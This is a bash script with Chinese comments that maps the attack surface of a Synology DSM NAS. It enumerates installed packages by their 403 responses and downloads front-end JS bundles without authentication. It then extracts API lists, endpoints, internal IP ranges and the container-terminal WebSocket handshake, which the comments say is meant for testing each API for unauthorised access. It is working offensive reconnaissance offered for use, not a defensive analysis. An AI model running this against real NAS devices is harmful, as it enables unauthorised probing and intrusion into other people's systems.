#!/bin/bash
# 群晖 DSM 套件前端 bundle 未鉴权扒取 + API 清单逆向
#
# 原理：
#   群晖 DSM 的 /webman/3rdparty/<pkg>/ 下的【配置文件】受保护（404 或需认证），
#   但【前端 JS bundle】未鉴权即可下载。bundle 里包含该套件的完整 SYNO.* API 清单、
#   端点路径、协议实现（含 WebSocket 协议），是绘制攻击面地图的高效手段。
#
# 判据（套件存在性）：
#   GET /webman/3rdparty/<pkg>/  → 403 = 套件已安装（目录存在但禁列表）
#                                → 404 = 未安装
#
# 价值：
#   1) 拿到该套件完整 API 清单 → 逐个测未授权（把 1131 个 API 缩到该套件相关的几十个）
#   2) 逆向出非 HTTP 协议（如容器终端 WebSocket 的握手序列）
#   3) bundle 中的路径/默认值可能泄露内网拓扑（如 Docker 网段 172.17-31.0.1、192.168.x.1）

TARGET="http://TARGET_HOST:5000"

# 步骤1：枚举已装套件（403 判据）
PKGS="ContainerManager qBittorrent Jellyfin FileBrowser SurveillanceStation Virtualization \
SynologyDrive SynologyPhotos WebDAVServer VPNCenter DownloadStation CloudSync alist3 natpierce \
AudioStation Contacts Chat VideoStation WebStation ScsiTarget"
echo "===== 已装套件探测（403=已装）====="
for pkg in $PKGS; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/webman/3rdparty/$pkg/")
  [ "$code" = "403" ] && echo "  [已装] $pkg"
done

# 步骤2：扒 JS bundle（未鉴权）
echo "===== JS bundle 扒取 ====="
JSNAMES="MainVue.js index.js main.js app.js bundle.js docker.js static/js/main.js \
dist/main.js dist/app.js ui/main.js assets/index.js"
mkdir -p bundles
for pkg in $PKGS; do
  for f in $JSNAMES; do
    url="$TARGET/webman/3rdparty/$pkg/$f"
    sz=$(curl -s -o /dev/null -w "%{size_download}" "$url")
    if [ "$sz" -gt 5000 ] 2>/dev/null; then
      out="bundles/$(echo "${pkg}_${f}" | tr '/' '_')"
      curl -s "$url" -o "$out"
      echo "  ★ $pkg/$f -> $sz 字节  → $out"
    fi
  done
done

# 步骤3：榨取 API 清单
echo "===== 提取 SYNO.* API 清单 ====="
for b in bundles/*; do
  echo "--- $b"
  grep -oE 'SYNO\.[A-Za-z0-9._]{3,60}' "$b" | sort -u | head -60
done

# 步骤4：找端点与协议（重点：WebSocket）
echo "===== 端点/协议线索 ====="
for b in bundles/*; do
  echo "--- $b"
  grep -oE '"/[a-zA-Z0-9_/.:-]{2,60}"' "$b" | sort -u | head -20
  grep -oE '[^"]{0,60}(ws://|wss://|new WebSocket|WebSocket\()[^"]{0,120}' "$b" | sort -u | head -10
done

# 步骤5：找路径与内网段
echo "===== 路径 / 内网段 ====="
for b in bundles/*; do
  grep -ohE '/(volume[0-9]+|homes?|root|etc|opt|usr/local)[a-zA-Z0-9_./@-]{0,80}' "$b" | sort -u | head -20
  grep -ohE '\b(?:10|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)\.[0-9]{1,3}\.[0-9]{1,3}\b' "$b" | sort -u | head -30
done

# 实测参考（203.0.113.40）：
#   未鉴权可下载：ContainerManager/MainVue.js (2,581,752) / docker.js (39,623)
#                 Contacts/static/js/main.js (2,342,614)
#                 SynologyDrive-ShareSync/app.js (139,913)
#   配置文件（config.json / INFO / ui/config / conf/privilege / package.json）全部受保护
#   从 docker.js 逆向出容器终端协议：
#     "/docker/ws" + "/bin/bash"，new WebSocket("ws://"+location.hostname+":"+location.port+"/docker/ws")
#     流程 connect → enter(containerName) → 收 tty_id → attach(tty_id)
#   端点实测：无 Upgrade 头 426 / 带 Upgrade 头 400（nginx 层拒，需认证会话）
